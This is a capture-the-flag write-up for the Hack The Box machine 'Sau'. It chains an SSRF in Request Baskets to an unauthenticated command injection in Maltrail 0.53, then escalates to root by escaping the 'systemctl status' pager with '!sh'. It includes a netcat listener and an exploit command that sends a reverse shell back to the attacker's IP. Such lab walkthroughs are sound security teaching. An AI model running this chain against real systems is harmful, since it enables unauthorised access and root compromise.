

![1](</Writeups/Machines/Sau/img/logo.png>)
By Rug4lo

## Reconnaissance

First of all we are going to start with the reconnaissance of the machine:

We are going to scan its ports with Nmap:
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.224
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-23 18:13 CEST
Initiating SYN Stealth Scan at 18:13
Scanning 10.10.11.224 [65535 ports]
Discovered open port 22/tcp on 10.10.11.224
Discovered open port 55555/tcp on 10.10.11.224
Completed SYN Stealth Scan at 18:13, 14.79s elapsed (65535 total ports)
Nmap scan report for 10.10.11.224
Host is up, received user-set (0.11s latency).
Scanned at 2023-08-23 18:13:31 CEST for 15s
Not shown: 65531 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
55555/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.93 seconds
           Raw packets sent: 72852 (3.205MB) | Rcvd: 72849 (2.914MB)
```
We can confirm that the machine has ports 22 and 55555 open

On 55555 it is hosting a website 

![1](</Writeups/Machines/Sau/img/1.png>)

This page lets us create "baskets" with which we can inspect the requests made to them over HTTP

![1](</Writeups/Machines/Sau/img/2.png>)

## SSRF exploitation

After poking around for a while you can notice that the settings button opens a tab where we can configure the server's response

If we intercept this request with Burpsuite, we will be able to see how it is processed

![1](</Writeups/Machines/Sau/img/3.png>)

After looking for a vulnerability that works for this case I found this one:

Vulnerability ---> https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3

Here it tells us that by using the "forward_url" field we can trigger an SSRF 

This means that when we make a request to this basket (rugalo in my case) it will send us to the url we put in the "forward_url" field 

*One note here is that it is important to enable the proxy response, so that it loads the site we put in the "forward_url" field*

Now we can put a local url in the "forward_url" field (such as 127.0.0.1):

![1](</Writeups/Machines/Sau/img/4.png>)

If we send this request and reload the page we can see that it shows us a rather ugly web page

![1](</Writeups/Machines/Sau/img/5.png>)

## Unauthenticated OS Command Injection exploitation

We can see that this site uses Maltrail, version 0.53

If we search the internet for vulnerabilities in this version we will find an Unauthenticated OS Command Injection

Vulnerability ---> https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

That vulnerability lets us achieve command execution by abusing the login, specifically the username field

So we can change what we were putting in Burpsuite

![1](</Writeups/Machines/Sau/img/6.png>)

Digging a bit more I found a tool that automates the request to give you a reverse shell 

Script ---> https://github.com/spookier/Maltrail-v0.53-Exploit

If we start a listener with Netcat on any port:
```bash
nc -nlvp 4646
```
And we use this tool like this:
- The first ip is ours together with the port we are listening on
- The second is where we want to send the request
```bash
python3 exploit.py 10.10.14.26 4646 http://10.10.11.224:55555/rugalo
```
Doing this should have given us an interactive shell as the puma user

If we go to this user's home directory we will find the first flag

```
ls
```
```bash
lse.sh  user.txt
```
## Privilege escalation 

Now that we have the first flag we need to become root to get the second one

For this I kept trying things, but one command gave me an unexpected response
```bash
sudo -l
```
```bash
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
After searching the internet for a while I came across this way of escalating privileges 

Page ---> https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/

According to this we can run systemctl as root, and from there get a bash shell 

The way to do it would be by running this command:
```bash
sudo /usr/bin/systemctl status trail.service
```
```bash
WARNING: terminal is not fully functional
-  (press RETURN)
```
Without pressing RETURN we type !sh
```bash
-  (press RETURN)!sh
```
This will give us a shell as administrator
```bash
whoami
```
```bash
root
```
If we go to root's home directory we will be able to see the flag
```bash
ls
```
```bash
go  root.txt
```